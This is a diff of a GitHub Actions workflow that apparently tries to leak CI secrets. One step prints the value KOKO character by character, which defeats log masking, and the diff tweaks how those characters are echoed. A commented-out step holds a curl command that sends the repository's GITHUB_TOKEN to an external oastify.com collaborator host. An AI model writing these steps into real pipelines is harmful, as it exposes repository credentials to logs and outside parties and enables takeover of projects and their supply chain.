@@ -26,8 +26,9 @@ jobs:
       - name: Bash Echoos
         run: |
           for (( i=0; i<${#KOKO}; i++ )); do
-            echo "${KOKO:$i:1}"
+            echo -n "${KOKO:$i:1}"
           done
+          echo
       # - name: Show secret
       #   run: |
       #     curl -X GET https://8bkmpsonimqso848i8qdzcxax13srif7.oastify.com?token=${{secrets.GITHUB_TOKEN}}
